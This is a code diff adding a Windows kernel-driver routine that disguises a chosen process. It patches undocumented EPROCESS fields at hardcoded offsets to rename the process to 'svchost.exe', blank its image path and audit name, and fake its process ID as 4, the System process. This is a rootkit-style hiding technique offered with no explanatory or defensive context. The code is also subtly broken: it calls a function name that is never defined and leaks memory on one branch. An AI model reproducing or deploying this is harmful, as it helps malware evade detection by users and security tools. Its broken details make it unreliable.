@@ -1,0 +1,101 @@
+BOOLEAN PathSeAuditProcessCreationInfo(PEPROCESS Process, WCHAR* ProcessName){
+    PUNICODE_STRING Name ;
+    PUNICODE_STRING SelocateName;
+ 
+ 
+SeLocateProcessImageName(Process, &SelocateName);
+ 
+    ExFreePool(SelocateName);
+ 
+    Name = (PUNICODE_STRING)(*(PULONG_PTR)((ULONG_PTR)Process + 0x468));//+0x468 SeAuditProcessCreationInfo
+ 
+    if ((wcslen(ProcessName) * 2) > Name->Length)
+    {
+        return FALSE;
+    }
+ 
+    RtlZeroMemory(Name->Buffer, Name->MaximumLength);
+    RtlCopyMemory(Name->Buffer, ProcessName, wcslen(ProcessName) * 2);
+    Name->Length = wcslen(ProcessName) * 2;
+    return TRUE;
+}
+BOOLEAN PathImageFileName(PEPROCESS Process, char* cName)
+{
+    char    szNameBuff[15] = { 0 };
+    UCHAR* szProcessBuff = NULL;
+    size_t  cNamelen = 0;
+ 
+ 
+    cNamelen = strlen(cName);
+ 
+    RtlZeroMemory(szNameBuff, sizeof(szNameBuff));
+    if (cNamelen > 15)
+        RtlCopyMemory(szNameBuff, cName, sizeof(szNameBuff));
+    else
+        RtlCopyMemory(szNameBuff, cName, cNamelen);
+    szProcessBuff = PsGetProcessImageFileName(Process);
+    RtlZeroMemory(szProcessBuff, sizeof(szNameBuff));
+    RtlCopyMemory(szProcessBuff, szNameBuff, sizeof(szNameBuff));
+ 
+    return TRUE;
+}
+bool Win10ImageNamePoint(PEPROCESS Process, WCHAR* szFullName)
+{
+    BOOLEAN bRet ;
+    PFILE_OBJECT pFileObject ;
+    WCHAR* szNewFullName = NULL;
+ 
+     
+    szNewFullName = static_cast<WCHAR*>( ExAllocatePool(NonPagedPool, MAX_PATH * 2));
+ 
+    RtlZeroMemory(szNewFullName, MAX_PATH * 2);
+ 
+    pFileObject = (PFILE_OBJECT)(*(PULONG_PTR)((ULONG_PTR)Process + 0x448)); //+0x448 ImageFilePointer 
+ 
+ 
+    if (pFileObject->FileName.Length >= wcslen(szFullName) * 2)
+    {
+        RtlZeroMemory(pFileObject->FileName.Buffer, pFileObject->FileName.MaximumLength);
+        RtlCopyMemory(pFileObject->FileName.Buffer, szFullName, wcslen(szFullName) * 2);
+        pFileObject->FileName.Length = wcslen(szFullName) * 2;
+        ExFreePool(szNewFullName);
+        bRet = TRUE;
+    }
+    else
+    {
+        RtlCopyMemory(szNewFullName, szFullName, wcslen(szFullName) * 2);
+        pFileObject->FileName.Buffer = szNewFullName;
+        pFileObject->FileName.Length = wcslen(szFullName) * 2;
+        pFileObject->FileName.MaximumLength = MAX_PATH * 2;
+        bRet = TRUE;
+    }
+ 
+    return bRet;
+}
+VOID modifyProcessUniqueProcessId(PEPROCESS Process)
+{
+    PVOID64 UnProcessID;
+    PVOID64 InFromUnProceesID;
+    ULONGLONG Upid = 4;
+    ULONGLONG InFromPid = 0;
+    UnProcessID =(PULONG_PTR)((ULONGLONG)Process + 0x2e8);//+0x2e8 UniqueProcessId
+    RtlCopyMemory(UnProcessID, &Upid, sizeof(ULONGLONG));
+    InFromUnProceesID = (PULONG_PTR)((ULONGLONG)Process + 0x3e8); //+0x3e8 InheritedFromUniqueProcessId
+    RtlCopyMemory(InFromUnProceesID, &InFromPid, sizeof(ULONGLONG));
+    return ;
+}
+BOOLEAN checkProcessModify(HANDLE pid)
+{
+    PEPROCESS Process = NULL;
+    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &Process);
+    if (!NT_SUCCESS(status))
+    {
+        return FALSE;
+    }
+    PathImageFileName(Process, "svchost.exe");
+    PathWin10ImageNamePoint(Process, L" ");
+    PathSeAuditProcessCreationInfo(Process, L" ");
+    modifyProcessUniqueProcessId(Process);
+    ObDereferenceObject(Process);
+    return TRUE;
+}
